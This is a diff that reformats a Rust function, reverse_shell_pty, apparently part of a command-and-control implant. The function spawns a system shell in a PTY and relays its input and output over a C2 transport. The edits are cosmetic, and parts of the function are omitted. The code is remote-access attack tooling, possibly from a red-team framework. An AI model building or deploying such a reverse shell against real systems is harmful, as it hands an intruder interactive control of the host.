@@ -1,25 +1,36 @@
 use alloc::string::String;
 use alloc::sync::Arc;
-use transport::SyncTransport;
-use portable_pty::{native_pty_system, CommandBuilder, PtySize};
-use std::io::{Read, Write};
 use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
+use portable_pty::{CommandBuilder, PtySize, native_pty_system};
+use std::io::{Read, Write};
 use std::sync::mpsc;
 use std::thread;
+use transport::SyncTransport;
 
-pub fn reverse_shell_pty(transport: Arc<dyn SyncTransport>, task_id: i64, cmd: Option<String>) -> Result<()> {
+pub fn reverse_shell_pty(
+    transport: Arc<dyn SyncTransport>,
+    task_id: i64,
+    cmd: Option<String>,
+) -> Result<()> {
     // 1. Setup PTY
     let pty_system = native_pty_system();
-    let pair = pty_system.openpty(PtySize { rows: 24, cols: 80, pixel_width: 0, pixel_height: 0 })?;
+    let pair = pty_system.openpty(PtySize {
+        rows: 24,
+        cols: 80,
+        pixel_width: 0,
+        pixel_height: 0,
+    })?;
 
     let cmd_builder = match cmd {
         Some(c) => CommandBuilder::new(c),
         None => {
             #[cfg(target_os = "windows")]
-            { CommandBuilder::new("cmd.exe") }
+            {
+                CommandBuilder::new("cmd.exe")
+            }
             #[cfg(not(target_os = "windows"))]
             {
-                 if std::path::Path::new("/bin/bash").exists() {
+                if std::path::Path::new("/bin/bash").exists() {
                     CommandBuilder::new("/bin/bash")
                 } else {
                     CommandBuilder::new("/bin/sh")
@@ -50,7 +61,7 @@ pub fn reverse_shell_pty(transport: Arc<dyn SyncTransport>, task_id: i64, cmd: O
 
         let mut buf = [0u8; 1024];
         loop {
-             match reader.read(&mut buf) {
+            match reader.read(&mut buf) {
                 Ok(0) => break, // EOF
                 Ok(n) => {
                     let _ = out_tx_clone.send(ReverseShellRequest {
@@ -58,7 +69,7 @@ pub fn reverse_shell_pty(transport: Arc<dyn SyncTransport>, task_id: i64, cmd: O
                         kind: ReverseShellMessageKind::Data.into(),
                         data: buf[..n].to_vec(),
                     });
-                     // Ping to flush (optional, matching previous logic)
+                    // Ping to flush (optional, matching previous logic)
                     let _ = out_tx_clone.send(ReverseShellRequest {
                         task_id,
                         kind: ReverseShellMessageKind::Ping.into(),
@@ -73,14 +84,12 @@ pub fn reverse_shell_pty(transport: Arc<dyn SyncTransport>, task_id: i64, cmd: O
     // 4. Spawn Transport (Blocking)
     // We run transport in a separate thread so we can handle input loop here
     let transport_clone = transport.clone();
-    let transport_thread = thread::spawn(move || {
-        transport_clone.reverse_shell(out_rx, in_tx)
-    });
+    let transport_thread = thread::spawn(move || transport_clone.reverse_shell(out_rx, in_tx));
 
     // 5. Input Loop (in_rx -> PTY Writer)
     for msg in in_rx {
         if msg.kind == ReverseShellMessageKind::Ping as i32 {
-             let _ = out_tx.send(ReverseShellRequest {
+            let _ = out_tx.send(ReverseShellRequest {
                 kind: ReverseShellMessageKind::Ping.into(),
                 data: msg.data,
                 task_id,
